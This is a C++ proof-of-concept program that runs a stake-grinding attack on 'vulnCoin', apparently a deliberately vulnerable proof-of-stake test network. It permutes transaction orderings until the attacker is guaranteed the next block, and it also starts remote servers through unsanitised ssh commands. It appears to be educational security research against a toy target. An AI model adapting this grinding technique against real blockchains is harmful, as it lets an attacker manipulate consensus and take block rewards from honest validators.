#include <iostream>
#include <vector>
#include <sstream>
#include <algorithm>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <cstring>
#include <thread>
#include <random>
#include <unistd.h>
#include <iomanip>
#include <openssl/sha.h>
#include <openssl/evp.h>

#include "../libs/rang.hpp"
#include "../libs/json.hpp"

//DEFAULT NETWORK SETTINGS - changing them is possible and encouraged, but be aware of the pitfalls listed below. It is possible that PoC breaks when settings are handled inadequately.
//Server is configured to receive messages of maximal length 4096 characters. This means that roughly (4096 - 76)/64 = 62 transactions can be created until the server breaks.
//Defines seconds to wait if connectivity issues were to occur. Program generally waits 5 * the DELAY_SECONDS.
#define DELAY_SECONDS 2
//Defines the number of blocks pre-generated by the network.
//Please make sure that this number is >= 4, it guarantees that at least one of the stakers has mined two blocks and is therefore eligible to deposit two stakes.
#define PREGENERATED_BLOCKS 10
//Number of consensus rounds to run.
//The absolute number of UTXOs existing in the network (be it in the mempool, stakepool or unspentTransactions pool) after finishing the consensus run will be equal to (PREGENERATED_BLOCKS + CONSENSUS_ROUNDS).
#define CONSENSUS_ROUNDS 15
//Size of the buffer created for receiving of the messages. Some of the called function (for example 'printBlockchain') return many characters.
#define BUFFER_SIZE 60000

/**
 * Function to return a hex string representing sha256 of given string.
 * @param stringToHash String to be hashed.
 * @return Hexadecimal string representing the hash of given string.
 */
std::string sha256(const std::string stringToHash) {
    //Initialize EVP objects from openssl library.
    EVP_MD_CTX *ctx = EVP_MD_CTX_new();
    const EVP_MD *md = EVP_sha256();
    unsigned int hash_len;
    unsigned char hashOutput[SHA256_DIGEST_LENGTH];

    //Hash.
    EVP_DigestInit_ex(ctx, md, nullptr);
    EVP_DigestUpdate(ctx, stringToHash.c_str(), stringToHash.size());
    EVP_DigestFinal_ex(ctx, hashOutput, &hash_len);

    //Free the allocated EVP object.
    EVP_MD_CTX_free(ctx);

    //Return the received hash as hexadecimal string.
    std::ostringstream hashOutputOss;
    for (size_t i = 0; i < hash_len; ++i) {
        hashOutputOss << std::setfill('0') << std::setw(2) << std::hex << (int) hashOutput[i];
    }

    return hashOutputOss.str();
}

/**
 * Thread function that runs the server on specified ip address in the background.
 * @param username Username to login into remote system with via ssh.
 * @param ipAddress IP address of the target of ssh.
 * @param port Port on which the server will be run.
 * @param attacker Specifies whether thread is an attacker or not for the purposes of output coloring.
 */
void server(const std::string &username, const std::string &ipAddress, const std::string &port, const bool attacker) {
    //Create the command for connecting to remote system and running the server.
    std::ostringstream oss;
    oss << "ssh " << username << "@" << ipAddress << " '(vulnCoin-server " << port << " 0)&'" << std::endl;

    //Start the server.
    system(oss.str().c_str());

    //Set output color.
    if (attacker) {
        std::cout << rang::fg::magenta << rang::style::bold;
    } else {
        std::cout << rang::fg::blue << rang::style::bold;
    }

    //Output the information about the server stopping.
    std::cout << "==============================" << std::endl
              << "Thread [" << username << "] is stopping." << std::endl
              << "==============================" << rang::style::reset << std::endl;
}

/**
 * Function that creates a socket to communicate with a remote server.
 * @param message Command to be sent to the remote server.
 * @param ipAddress IP address of the remote server.
 * @param port Port of the remote server.
 * @return Response received from the remote server or an empty string.
 */
std::string sendMessageToIpAddress(const std::string message, const std::string &ipAddress, const std::string &port) {
    //Create a socket and socket information based on the specified attributes.
    int messageSocket = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in serverAddr;
    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(std::stoi(port));
    inet_pton(AF_INET, ipAddress.c_str(), &serverAddr.sin_addr);

    //Try connecting to the server. In case of failure return empty string.
    if (connect(messageSocket, reinterpret_cast<struct sockaddr *>(&serverAddr), sizeof(serverAddr))) {
        return "";
    }

    //Send the specified command to the remote server.
    send(messageSocket, message.c_str(), message.size(), 0);

    //Receive an answer from the server.
    char buffer[BUFFER_SIZE];
    int receivedBytesCnt = recv(messageSocket, buffer, sizeof(buffer), 0);
    buffer[receivedBytesCnt] = '\0';

    //Close the socket and return received message.
    close(messageSocket);
    return std::string(buffer);
}

/**
 * Function to stop all the specified servers.
 * @param ipAddresses Vector of IP addresses to be stopped.
 * @param port Port on which the servers are running.
 */
void stopServers(const std::vector<std::string> &ipAddresses, const std::string port) {
    for (const std::string &ipAddress: ipAddresses) {
        sendMessageToIpAddress("stop", ipAddress, port);
    }
}

/**
 * Function to randomly generate a block containing ONLY a coinbase transaction.
 * @param ipAddresses Non-empty vector of IP addresses of all servers.
 * @param port Port on which the servers communicate.
 * @return Position of the block creator in the "ipAddresses" vector.
 */
int generateRandomBlock(std::vector<std::string> ipAddresses, const std::string &port) {
    //Generate randomly position of the block creator.
    int randomPos = std::rand() % ipAddresses.size();

    //Save the selected IP and erase it from the vector.
    std::string randomlyChosenIp = ipAddresses[randomPos];
    std::vector<std::string>::iterator it = ipAddresses.begin();
    std::advance(it, randomPos);
    ipAddresses.erase(it);

    //Generate the block.
    sendMessageToIpAddress("generate", randomlyChosenIp, port);

    //Parse transaction ID of the coinbase transaction.
    std::string blockchain = sendMessageToIpAddress("printBlockchain", randomlyChosenIp, port);
    nlohmann::json unspentOutputs = nlohmann::json::parse(blockchain);
    std::string coinbaseTxid = unspentOutputs[unspentOutputs.size() - 1]["transactions"][0];
    std::ostringstream commandPrint;
    commandPrint << "printTransaction " << coinbaseTxid;
    nlohmann::json coinbaseTransactionJson = nlohmann::json::parse(
            sendMessageToIpAddress(commandPrint.str(), randomlyChosenIp, port));

    //Send the newly created coinbase transaction and block to remaining network participants.
    std::ostringstream commandLoad, commandPropose;
    commandLoad << "loadCoinbaseTransaction " << coinbaseTransactionJson["address"].get<std::string>() << " "
                << coinbaseTransactionJson["timestamp"].get<std::string>();
    commandPropose << "proposeBlock {" << coinbaseTxid << "}";
    for (const std::string &address: ipAddresses) {
        sendMessageToIpAddress(commandLoad.str(), address, port);
        sendMessageToIpAddress(commandPropose.str(), address, port);
    }

    //Return index of the block creator in the "ipAddresses" vector.
    return randomPos;
}

/**
 * Generate randomized block containing random number of transactions from the mempool and a coinbase transaction assigned to the creator specified by address.
 * @param expectedCreator vulnCoin address of the block creator.
 * @param ipAddresses IP addresses of all servers in the network.
 * @param vulnCoinAddresses vulnCoin addresses of all servers in the network.
 * @param port Port on which servers communicate.
 */
void generateBlockTo(const std::string &expectedCreator, const std::vector<std::string> &ipAddresses,
                     const std::vector<std::string> &vulnCoinAddresses, const std::string port) {

    //Find index of the specified block creator.
    size_t creatorIndex = 0;
    while (vulnCoinAddresses[creatorIndex] != expectedCreator) {
        ++creatorIndex;
    }

    //Parse mempool of the block creator as JSON.
    nlohmann::json mempoolJson = nlohmann::json::parse(
            sendMessageToIpAddress("listMempool", ipAddresses[creatorIndex], port));

    std::cout << rang::fg::blue << rang::style::bold << "Block creator has [" << mempoolJson.size()
              << "] transactions in their mempool." << rang::style::reset << std::endl;
    //Generate random number < mempoolJson.size() representing the amount of transactions embedded into a block.
    int transactionCnt;
    if (mempoolJson.size() > 0) {
        transactionCnt = std::rand() % mempoolJson.size();
    } else {
        transactionCnt = 0;
    }

    //Create a new coinbase transaction assigned to the block creator. We are creating the block first on the server [0] for simplicity purposes, it does not really matter on which server we start.
    std::ostringstream commandLoad, commandPropose;
    const auto timeNow = std::chrono::system_clock::now();
    commandLoad << "loadCoinbaseTransaction " << expectedCreator << " "
                << std::chrono::duration_cast<std::chrono::seconds>(timeNow.time_since_epoch()).count();
    std::string coinbaseTxid = sendMessageToIpAddress(commandLoad.str(), ipAddresses[0], port);
    commandPropose << "proposeBlock {" << coinbaseTxid;
    for (int i = 0; i < transactionCnt; ++i) {
        commandPropose << " " << mempoolJson[i]["txid"].get<std::string>();
    }
    commandPropose << "}";
    sendMessageToIpAddress(commandPropose.str(), ipAddresses[0], port);

    //Send the information about the block to all the remaining servers.
    for (size_t i = 1; i < ipAddresses.size(); ++i) {
        sendMessageToIpAddress(commandLoad.str(), ipAddresses[i], port);
        sendMessageToIpAddress(commandPropose.str(), ipAddresses[i], port);
    }

}

/**
 * Creates almost as much transactions as possible on every received IP address, one UTXO is kept for staking purposes.
 * @param ipAddresses IP addresses of the servers to create the transactions on.
 * @param port Port on which the servers operate.
 * @param addresses vulnCoin addresses of the servers.
 */
void createTransactions(const std::vector<std::string> &ipAddresses, const std::string port,
                        const std::vector<std::string> addresses) {
    //For each of the servers.
    for (size_t i = 0; i < ipAddresses.size(); ++i) {
        //Create vector of ipAddresses without the currently chosen one.
        std::vector<std::string> receiversIpAddresses = ipAddresses;
        std::vector<std::string>::iterator it = receiversIpAddresses.begin();
        std::advance(it, i);
        receiversIpAddresses.erase(it);

        //Parse UTXOs linked to the currently chosen server as JSON.
        nlohmann::json unspentOutputs = nlohmann::json::parse(
                sendMessageToIpAddress("listUnspentLinkedToMe", ipAddresses[i], port));

        int lastReceiver = addresses.size();
        //We want to save one UTXO for staking, others can be sent across the network to simulate standard network flow.
        while (unspentOutputs.size() > 1) {
            //Randomly select a receiver of the newly created transaction. We want to ensure that they are different from last receiver as an additional protection against generation of duplicate txids.
            int randomReceiver = std::rand() % addresses.size();
            while (lastReceiver == randomReceiver) {
                randomReceiver = std::rand() % addresses.size();
            }

            //Create the transaction and get its properties (mainly timestamp).
            std::ostringstream newTransactionOss;
            newTransactionOss << "createNewTransaction "
                              << unspentOutputs[0]["txid"].get<std::string>() << " "
                              << unspentOutputs[0]["address"].get<std::string>() << " "
                              << addresses[randomReceiver];

            std::cout << rang::fg::yellow << rang::style::bold << "UTXO with txid ["
                      << unspentOutputs[0]["txid"].get<std::string>() << "] tied to address ["
                      << unspentOutputs[0]["address"].get<std::string>()
                      << " has been used to generate transaction with txid [";

            std::string newTxid = sendMessageToIpAddress(newTransactionOss.str(), ipAddresses[i], port);
            std::ostringstream printTransactionOss;
            printTransactionOss << "printTransaction " << newTxid;
            nlohmann::json newTxJson = nlohmann::json::parse(
                    sendMessageToIpAddress(printTransactionOss.str(), ipAddresses[i], port));

            //Create a command to load the newly created transaction on all the remaining servers.
            std::ostringstream loadTransactionOss;
            loadTransactionOss << "loadTransaction "
                               << unspentOutputs[0]["txid"].get<std::string>() << " "
                               << unspentOutputs[0]["address"].get<std::string>() << " "
                               << newTxJson["address"].get<std::string>() << " "
                               << newTxJson["timestamp"].get<std::string>();

            //Send the newly created transaction on the remaining servers
            for (const std::string &ipAddress: receiversIpAddresses) {
                sendMessageToIpAddress(loadTransactionOss.str(), ipAddress, port);
            }

            std::cout << newTxJson["txid"].get<std::string>() << "] tied to address ["
                      << newTxJson["address"].get<std::string>() << "]." << std::endl;

            //Reload unspent outputs and lastReceiver.
            unspentOutputs = nlohmann::json::parse(
                    sendMessageToIpAddress("listUnspentLinkedToMe", ipAddresses[i], port));
            lastReceiver = randomReceiver;

            //Sleep one second is a measure to protect network against duplicit txids.
            sleep(1);
        }
    }
}

/**
 * Function to make all specified servers that can deposit UTXO as a stake.
 * @param ipAddresses Vector of IP addresses of servers in the network.
 * @param port Port on which the servers communicate.
 * @param addresses vulnCoin addresses of the specified servers.
 */
void createStakes(const std::vector<std::string> &ipAddresses, const std::string port,
                  const std::vector<std::string> addresses) {
    //For each of the servers.
    for (size_t i = 0; i < ipAddresses.size(); ++i) {
        nlohmann::json unspentOutputs = nlohmann::json::parse(
                sendMessageToIpAddress("listUnspentLinkedToMe", ipAddresses[i], port));

        //If usable UTXO exists, stake it.
        if (!unspentOutputs.empty()) {
            std::ostringstream stakeOss;
            stakeOss << "stake "
                     << unspentOutputs[0]["txid"].get<std::string>() << " "
                     << unspentOutputs[0]["address"].get<std::string>();

            for (const std::string &ipAddress: ipAddresses) {
                sendMessageToIpAddress(stakeOss.str(), ipAddress, port);
            }
        }
    }
}

/**
 * Count hash of the block based on hash of the previous block and transaction vector.
 * @param prevBlockHash
 * @param transactions Vector of transactions to be embedded into a block. **
 * @return
 */
std::string getBlockHash(const std::string prevBlockHash, const std::vector<std::string> &transactions) {
    std::ostringstream transactionOss, blockOss;
    for (size_t i = 0; i < transactions.size(); ++i) {
        transactionOss << transactions[i];
    }
    std::string transactionHash = sha256(transactionOss.str());

    blockOss << prevBlockHash << transactionHash;
    return sha256(blockOss.str());
}

/**
 * Grind trough possible permutations of transaction IDs to guarantee win of the next consensus round.
 * @param ipAddresses IP addresses of all running servers.
 * @param port Port on which the servers are running.
 * @param selectedAddress vulnCoin address of the grinding node (however the function is designed to work only for attacker, this parameter is passed for aestethical purposes).
 */
void grind(const std::vector<std::string> &ipAddresses, const std::string port, const std::string selectedAddress) {
    //Parse stakepool, old stakepool, blockchain and mempool as JSONs.
    nlohmann::json stakepoolJson = nlohmann::json::parse(
            sendMessageToIpAddress("listStakepool", ipAddresses[0], port)), oldStakepoolJson = nlohmann::json::parse(
            sendMessageToIpAddress("listOldStakepool", ipAddresses[0], port)), blockchainJson = nlohmann::json::parse(
            sendMessageToIpAddress("printBlockchain", ipAddresses[0],
                                   port)), unspentTransactionsJson = nlohmann::json::parse(
            sendMessageToIpAddress("listMempool", ipAddresses[0], port));

    //The stakepool is implemented as a map, and therefore, we need to find what index the attacker holds.
    size_t searchedIndex = 0;
    while (stakepoolJson[searchedIndex]["address"].get<std::string>() != selectedAddress) {
        ++searchedIndex;
    }

    //Count hash of the last block in the blockchain.
    std::vector<std::string> lastBlockTxids;
    for (size_t i = 0; i < blockchainJson[blockchainJson.size() - 1]["transactions"].size(); ++i) {
        lastBlockTxids.push_back(blockchainJson[blockchainJson.size() - 1]["transactions"][i].get<std::string>());
    }
    std::string lastBlockHash = getBlockHash(
            blockchainJson[blockchainJson.size() - 1]["prevBlockHash"].get<std::string>(), lastBlockTxids);

    //Create a new coinbase transaction as a reward for newly created block.
    const auto timeNow = std::chrono::system_clock::now();
    std::ostringstream commandLoad;
    commandLoad << "loadCoinbaseTransaction " << selectedAddress << " "
                << std::chrono::duration_cast<std::chrono::seconds>(timeNow.time_since_epoch()).count();
    std::string coinbaseTxid = sendMessageToIpAddress(commandLoad.str(), ipAddresses[0], port);
    for (size_t i = 1; i < ipAddresses.size(); ++i) {
        sendMessageToIpAddress(commandLoad.str(), ipAddresses[i], port);
    }

    //Create vector of usable txids. Sort it so we can correctly use it with std::next_permutation().
    std::vector<std::string> txids = {coinbaseTxid};
    for (size_t i = 0; i < unspentTransactionsJson.size(); ++i) {
        txids.push_back(unspentTransactionsJson[i]["txid"].get<std::string>());
    }
    std::sort(txids.begin(), txids.end());
    std::cout << rang::fg::magenta << rang::style::bold << "Attacker has [" << txids.size()
              << "] transactions in their mempool. They can grind through " << txids.size() << "! permutations."
              << rang::style::reset << std::endl;

    //Start counting index of the next creator from the old stakepool.
    unsigned int creator = 0, x;
    //Convert first 32 bits of address into u_int and modulate it. Will overflow and break the attack on architectures that implement u_int as 16-bit instead of 32-bit.
    for (size_t i = 0; i < oldStakepoolJson.size(); ++i) {
        sscanf(oldStakepoolJson[i]["address"].get<std::string>().substr(0, 16).c_str(), "%x", &x);
        creator += x % stakepoolJson.size();
    }

    //Try permutations of possible transactions, count block hashes.
    bool successfulGrind = false;
    size_t i = 0;
    do {
        std::cout << rang::fg::magenta << rang::style::bold << "Attacker is trying permutation [" << i << "]."
                  << rang::style::reset << std::endl;
        //Create block with permutated set of transactions and check it against the desired index.
        std::string newBlockHash = getBlockHash(lastBlockHash, txids);
        sscanf(newBlockHash.substr(0, 16).c_str(), "%x", &x);

        if ((creator + (x % stakepoolJson.size())) % stakepoolJson.size() == searchedIndex) {
            std::cout << rang::fg::magenta << rang::style::bold
                      << "Attacker found good block hash -> " << rang::fg::green
                      << "They are guaranteed to win the next consensus round!"
                      << rang::style::reset << std::endl;

            //Create command to append block to the blockchain.
            std::ostringstream proposeBlock;
            proposeBlock << "proposeBlock {";
            for (size_t i = 0; i < txids.size(); ++i) {
                proposeBlock << txids[i];
                if (i != txids.size() - 1) {
                    proposeBlock << " ";
                }
            }
            proposeBlock << "}";

            //Broadcast the block to the network.
            for (const std::string &ipAddress: ipAddresses) {
                sendMessageToIpAddress(proposeBlock.str(), ipAddress, port);
            }

            //Signalize succesful grind and stop grinding.
            successfulGrind = true;
            break;
        }
        ++i;
    } while (std::next_permutation(txids.begin(), txids.end()));

    //If the grind was unsuccessful, create the last permutated block.
    if (!successfulGrind) {
        std::cout << rang::fg::red << rang::style::bold << "Grinding unsuccessful!" << rang::style::reset << std::endl;

        //Create command to append block to the blockchain.
        std::ostringstream proposeBlock;
        proposeBlock << "proposeBlock {";
        for (size_t i = 0; i < txids.size(); ++i) {
            proposeBlock << txids[i];
            if (i != txids.size() - 1) {
                proposeBlock << " ";
            }
        }
        proposeBlock << "}";

        for (const std::string &ipAddress: ipAddresses) {
            sendMessageToIpAddress(proposeBlock.str(), ipAddress, port);
        }
    }
}

/**
 * Main function of the PoC.
 * @return 1 in case of connectivity issues. Otherwise 0.
 */
int main() {
    //Initiate randomness.
    srand(time(nullptr));

    //Get vector of IP addresses, vector of usernames for ssh and a port number.
    std::vector<std::string> ipAddresses(
            {std::getenv("IP_ATTACKER"), std::getenv("IP_VICTIM1"), std::getenv("IP_VICTIM2")}), usernames(
            {"attacker", "victim1", "victim2"});
    std::string port(std::getenv("PORT"));

    //Run servers in separate threads. Sleeps guarantee that random addresses are generated for each of the servers.
    std::vector<std::thread> threads;
    threads.emplace_back(std::thread(server, std::ref(usernames[0]), std::ref(ipAddresses[0]), std::ref(port), true));
    sleep(1);
    threads.emplace_back(std::thread(server, std::ref(usernames[1]), std::ref(ipAddresses[1]), std::ref(port), false));
    sleep(1);
    threads.emplace_back(std::thread(server, std::ref(usernames[2]), std::ref(ipAddresses[2]), std::ref(port), false));

    //Ensure that all servers are running. If [5] tries have happened, stop the applications.
    size_t timeoutCnt = 0;
    while (sendMessageToIpAddress("getBlockCount", ipAddresses[0], port) != "1" ||
           sendMessageToIpAddress("getBlockCount", ipAddresses[1], port) != "1" ||
           sendMessageToIpAddress("getBlockCount", ipAddresses[2], port) != "1") {
        if (timeoutCnt == 5) {
            std::cout << rang::fg::red << rang::style::bold
                      << "Timeout has happened. Wait for a while and then try running the application again."
                      << rang::style::reset << std::endl;
            stopServers(ipAddresses, port);
            exit(1);
        }
        ++timeoutCnt;
        std::cout << rang::fg::gray << rang::style::bold << "Waiting for start of the servers." << rang::style::reset
                  << std::endl;

        sleep(DELAY_SECONDS);
    }
    std::cout << rang::fg::green << rang::style::bold << "Servers successfully started!" << rang::style::reset
              << std::endl;

    //Load the randomly generated addresses.
    std::vector<std::string> vulncoinAddresses;
    for (size_t i = 0; i < ipAddresses.size(); ++i) {
        vulncoinAddresses.push_back(sendMessageToIpAddress("printAddress", ipAddresses[i], port));
    }

    //Generate [PREGENERATED_BLOCKS] blocks randomly to create spendable outputs. The creator node is chosen randomly.
    std::cout << rang::fg::gray << rang::style::bold << "Generating [" << PREGENERATED_BLOCKS << "] blocks randomly:"
              << std::endl << "=======================================" << std::endl;
    for (size_t i = 0; i < PREGENERATED_BLOCKS; ++i) {
        std::cout << "Block [" << i << "] was generated by [" << usernames[generateRandomBlock(ipAddresses, port)]
                  << "]." << std::endl;
        sleep(1);
    }
    std::cout << rang::fg::gray << rang::style::bold << "=======================================" << std::endl
              << "First [" << PREGENERATED_BLOCKS << "] blocks have been randomly generated." << std::endl
              << "Placing first set of stakes! Transactions in the stakepool are:" << std::endl
              << "=======================================" << rang::style::reset << std::endl;

    //Create stakepool for the first block.
    createStakes(ipAddresses, port, vulncoinAddresses);
    std::cout << sendMessageToIpAddress("listStakepool", ipAddresses[0], port) << std::endl;
    std::cout << rang::fg::gray << rang::style::bold << "=======================================" << std::endl;

    //Variables representing number of blocks mined by attacker/rest of the network.
    size_t attackerTotal = 0, networkTotal = 0;

    //Start consensus rounds.
    for (size_t i = 0; i < CONSENSUS_ROUNDS; ++i) {
        //Create as many random transactions as possible.
        std::cout << rang::fg::gray << rang::style::bold << "STARTING [" << i << ".] CONSENSUS ROUND!" << std::endl
                  << "Network will now generate randomized transactions to fill the mempool:" << std::endl
                  << "=======================================" << rang::style::reset << std::endl;
        createTransactions(ipAddresses, port, vulncoinAddresses);
        std::cout << rang::fg::gray << rang::style::bold << "=======================================" << std::endl;

        //Get the next creator index and ensure that all the nodes return the same results.
        std::cout << rang::fg::gray << rang::style::bold
                  << "Network will now pick the creator of the next (n-th) block and finalize a stakepool for creation of (n+1)-th block:"
                  << std::endl << "=======================================" << rang::style::reset << std::endl;
        const std::string expectedCreator = sendMessageToIpAddress("countNextValidator", ipAddresses[0], port);
        for (size_t i = 1; i < ipAddresses.size(); ++i) {
            if (sendMessageToIpAddress("countNextValidator", ipAddresses[i], port) != expectedCreator) {
                std::cout << rang::fg::red << rang::style::bold
                          << "Nodes became desynchronized for unknown reasons. Try running the attack one more time."
                          << rang::style::reset << std::endl;
                stopServers(ipAddresses, port);
                exit(1);
            }
        }

        //Create stakepool for the creation of the next block.
        createStakes(ipAddresses, port, vulncoinAddresses);

        //If attacker has been chosen as a block creator, they can start grinding. Otherwise, randomized block is generated by the selected block creator.
        if (expectedCreator == vulncoinAddresses[0]) {
            std::cout << rang::fg::green << rang::style::bold << "Attacker was chosen as a block creator!"
                      << rang::style::reset << std::endl;
            ++attackerTotal;
            grind(ipAddresses, port, vulncoinAddresses[0]);
            std::cout << rang::fg::gray << rang::style::bold << "======================================="
                      << rang::style::reset << std::endl;
        } else {
            std::cout << rang::fg::red << rang::style::bold
                      << "Attacker was not chosen as a block creator. Generating random block to the address of the chosen creator."
                      << rang::style::reset << std::endl;
            ++networkTotal;
            generateBlockTo(expectedCreator, ipAddresses, vulncoinAddresses, port);
            std::cout << rang::fg::gray << rang::style::bold << "======================================="
                      << rang::style::reset << std::endl;
        }

    }

    //Stop all the servers.
    stopServers(ipAddresses, port);

    //Wait for all threads to stop.
    for (std::thread &thread: threads) {
        thread.join();
    }

    //Print the results. Attack is deemed successful if the attacker managed to create more blocks than the rest of the network.
    if (attackerTotal > networkTotal) {
        std::cout << rang::fg::green << rang::style::bold << "Attack successful!" << std::endl;
    } else {
        std::cout << rang::fg::red << rang::style::bold << "Attack unsuccessful!" << std::endl;
    }
    std::cout << rang::fg::magenta << rang::style::bold << "Attacker" << rang::fg::gray << " has created ["
              << rang::fg::magenta << attackerTotal << rang::fg::gray << "] blocks, while " << rang::fg::blue
              << "rest of the network" << rang::fg::gray << " has created [" << rang::fg::blue << networkTotal
              << rang::fg::gray << "] blocks." << rang::style::reset << std::endl;
    return 0;
}

